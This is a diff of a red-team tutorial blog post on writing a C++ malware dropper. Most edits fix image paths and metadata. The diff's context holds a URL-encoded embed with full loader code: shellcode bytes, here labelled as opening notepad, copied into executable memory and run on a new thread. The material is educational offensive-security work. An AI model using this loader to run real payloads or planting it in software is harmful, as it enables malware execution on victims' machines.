@@ -2,14 +2,14 @@
 title: "Malware Development: Writing a C++ dropper"
 author: "Trevor Saudi"
 date: 2023-07-19
-description: "Host Enumeration with Covenant & Metasploit"
-image: "/posts/2023-03-25_red_team01/images/logo.png"
+description: "Malware Development: Writing a C++ dropper"
+image: "/posts/2023-07-19_red_team01/images/logo.png"
 tags:
 - Red Teaming
 - Malware Development
 
 ---
-![image](/posts/2023-03-25_red_team02/images/logo.png)
+![image](/posts/2023-07-19_red_team02/images/logo.png)
 
 
 ## Introduction
@@ -32,7 +32,7 @@ tags:
 - In the analysis and development of malware, it is important to be familiar with the PE file structure to understand how malware works on a basic level, what it does from a behavioral analysis point of view, such as how it interacts with the operating system, antivirus or EDR in place and how it communicates externally. etc
 - In its simplest form, the PE file format is organized as follows:
 
-    ![image](/posts/2023-03-25_red_team02/images/image1.png)
+    ![image](/posts/2023-07-19_red_team02/images/image1.png)
 
 ### Headers
 
@@ -109,7 +109,7 @@ tags:
 
 - We will write our first program that uses the MessageBox API to display some text. The implementation of the API is well documented as shown:
 
-    ![image](/posts/2023-03-25_red_team02/images/image7.png)
+    ![image](/posts/2023-07-19_red_team02/images/image7.png)
 
 - In your IDE, we can import the relevant libraries and implement the API as shown in the [docs](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messagebox)
 <iframe
@@ -118,7 +118,7 @@ tags:
   sandbox="allow-scripts allow-same-origin">
 </iframe>
 
-  ![image](/posts/2023-03-25_red_team02/images/gif2.gif)
+  ![image](/posts/2023-07-19_red_team02/images/gif2.gif)
 
 - Let's move on to the APIs necessary to implement for our dropper.
 
@@ -189,14 +189,22 @@ tags:
 
 - Putting together the above APIs, we have the following C++ stageless implant that executes shellcode for us.
 
+
+{{< alert >}}
+
+Note that some of the APIs have optional parameters which we don't have to put values, we put a 0 in place
+{{< /alert >}}
+
+
+
 <iframe
   src="https://carbon.now.sh/embed?bg=rgba%280%2C0%2C202%2C0%29&t=panda-syntax&wt=sharp&l=text%2Fx-c%2B%2Bsrc&width=768&ds=false&dsyoff=20px&dsblur=68px&wc=true&wa=false&pv=0px&ph=0px&ln=false&fl=1&fm=Fira+Code&fs=14px&lh=143%25&si=false&es=2x&wm=false&code=%2523include%2520%253Cwindows.h%253E%250A%2523include%2520%253Cstdio.h%253E%250A%2523include%2520%253Cstdlib.h%253E%250A%2523include%2520%253Cstring.h%253E%250A%250Aint%2520main%28void%29%2520%257B%250A%250A%2509void*%2520exec_mem%253B%250A%2509BOOL%2520rv%253B%250A%2509HANDLE%2520th%253B%250A%2509DWORD%2520oldprotect%2520%253D%25200%253B%250A%250A%2509unsigned%2520char%2520payload%255B%255D%2520%253D%2520%257B%250A%2509%2509%252F%252F%2520shellcode%2520to%2520open%2520notepad%250A%2509%25200xfc%252C0x48%252C0x83%252C0xe4%252C0xf0%252C0xe8%252C0xc0%252C0x00%252C0x00%252C0x00%252C0x41%252C0x51%252C0x41%252C0x50%250A%2509%252C0x52%252C0x51%252C0x56%252C0x48%252C0x31%252C0xd2%252C0x65%252C0x48%252C0x8b%252C0x52%252C0x60%252C0x48%252C0x8b%252C0x52%250A%2509%252C0x18%252C0x48%252C0x8b%252C0x52%252C0x20%252C0x48%252C0x8b%252C0x72%252C0x50%252C0x48%252C0x0f%252C0xb7%252C0x4a%252C0x4a%250A%2509%252C0x4d%252C0x31%252C0xc9%252C0x48%252C0x31%252C0xc0%252C0xac%252C0x3c%252C0x61%252C0x7c%252C0x02%252C0x2c%252C0x20%252C0x41%250A%2509%252C0xc1%252C0xc9%252C0x0d%252C0x41%252C0x01%252C0xc1%252C0xe2%252C0xed%252C0x52%252C0x41%252C0x51%252C0x48%252C0x8b%252C0x52%250A%2509%252C0x20%252C0x8b%252C0x42%252C0x3c%252C0x48%252C0x01%252C0xd0%252C0x8b%252C0x80%252C0x88%252C0x00%252C0x00%252C0x00%252C0x48%250A%2509%252C0x85%252C0xc0%252C0x74%252C0x67%252C0x48%252C0x01%252C0xd0%252C0x50%252C0x8b%252C0x48%252C0x18%252C0x44%252C0x8b%252C0x40%250A%2509%252C0x20%252C0x49%252C0x01%252C0xd0%252C0xe3%252C0x56%252C0x48%252C0xff%252C0xc9%252C0x41%252C0x8b%252C0x34%252C0x88%252C0x48%250A%2509%252C0x01%252C0xd6%252C0x4d%252C0x31%252C0xc9%252C0x48%252C0x31%252C0xc0%252C0xac%252C0x41%252C0xc1%252C0xc9%252C0x0d%252C0x41%250A%2509%252C0x01%252C0xc1%252C0x38%252C0xe0%252C0x75%252C0xf1%252C0x4c%252C0x03%252C0x4c%252C0x24%252C0x08%252C0x45%252C0x39%252C0xd1%250A%2509%252C0x75%252C0xd8%252C0x58%252C0x44%252C0x8b%252C0x40%252C0x24%252C0x49%252C0x01%252C0xd0%252C0x66%252C0x41%252C0x8b%252C0x0c%250A%2509%252C0x48%252C0x44%252C0x8b%252C0x40%252C0x1c%252C0x49%252C0x01%252C0xd0%252C0x41%252C0x8b%252C0x04%252C0x88%252C0x48%252C0x01%250A%2509%252C0xd0%252C0x41%252C0x58%252C0x41%252C0x58%252C0x5e%252C0x59%252C0x5a%252C0x41%252C0x58%252C0x41%252C0x59%252C0x41%252C0x5a%250A%2509%252C0x48%252C0x83%252C0xec%252C0x20%252C0x41%252C0x52%252C0xff%252C0xe0%252C0x58%252C0x41%252C0x59%252C0x5a%252C0x48%252C0x8b%250A%2509%252C0x12%252C0xe9%252C0x57%252C0xff%252C0xff%252C0xff%252C0x5d%252C0x48%252C0xba%252C0x01%252C0x00%252C0x00%252C0x00%252C0x00%250A%2509%252C0x00%252C0x00%252C0x00%252C0x48%252C0x8d%252C0x8d%252C0x01%252C0x01%252C0x00%252C0x00%252C0x41%252C0xba%252C0x31%252C0x8b%250A%2509%252C0x6f%252C0x87%252C0xff%252C0xd5%252C0xbb%252C0xf0%252C0xb5%252C0xa2%252C0x56%252C0x41%252C0xba%252C0xa6%252C0x95%252C0xbd%250A%2509%252C0x9d%252C0xff%252C0xd5%252C0x48%252C0x83%252C0xc4%252C0x28%252C0x3c%252C0x06%252C0x7c%252C0x0a%252C0x80%252C0xfb%252C0xe0%250A%2509%252C0x75%252C0x05%252C0xbb%252C0x47%252C0x13%252C0x72%252C0x6f%252C0x6a%252C0x00%252C0x59%252C0x41%252C0x89%252C0xda%252C0xff%250A%2509%252C0xd5%252C0x6e%252C0x6f%252C0x74%252C0x65%252C0x70%252C0x61%252C0x64%252C0x2e%252C0x65%252C0x78%252C0x65%252C0x00%250A%2509%257D%253B%250A%250A%2520%2520%2520%2520unsigned%2520int%2520payload_len%2520%253D%2520350%253B%250A%250A%2509%252F%252F%2520Allocate%2520a%2520memory%2520buffer%2520for%2520payload%250A%2509exec_mem%2520%253D%2520VirtualAlloc%280%252C%2520payload_len%252C%2520MEM_COMMIT%2520%257C%2520MEM_RESERVE%252C%2520PAGE_READWRITE%29%253B%250A%2520%2520%2520%2520%252F%252F%2520Copy%2520payload%2520to%2520new%2520buffer%250A%2509RtlMoveMemory%28exec_mem%252C%2520payload%252C%2520payload_len%29%253B%250A%2509%252F%252F%2520Make%2520new%2520buffer%2520as%2520executable%250A%2509rv%2520%253D%2520VirtualProtect%28exec_mem%252C%2520payload_len%252C%2520PAGE_EXECUTE_READ%252C%2520%2526oldprotect%29%253B%250A%2509%252F%252F%2520If%2520all%2520good%252C%2520run%2520the%2520payload%250A%2509if%2520%28rv%2520%21%253D%25200%29%2520%257B%250A%2509%2509th%2520%253D%2520CreateThread%280%252C%25200%252C%2520%28LPTHREAD_START_ROUTINE%29exec_mem%252C%25200%252C%25200%252C%25200%29%253B%250A%2509%2509WaitForSingleObject%28th%252C%2520-1%29%253B%250A%2509%257D%250A%250A%2509return%25200%253B%250A%257D"
-  style="width: 783px; height: 1210px; border:0; transform: scale(1); overflow:hidden;"
+  style="width: 783px; height: 1100px; border:0; transform: scale(1); overflow:hidden;"
   sandbox="allow-scripts allow-same-origin">
 </iframe>
 
 
-![image](/posts/2023-03-25_red_team02/images/gif1.gif)
+![image](/posts/2023-07-19_red_team02/images/gif1.gif)
 
 ## Exercise
 
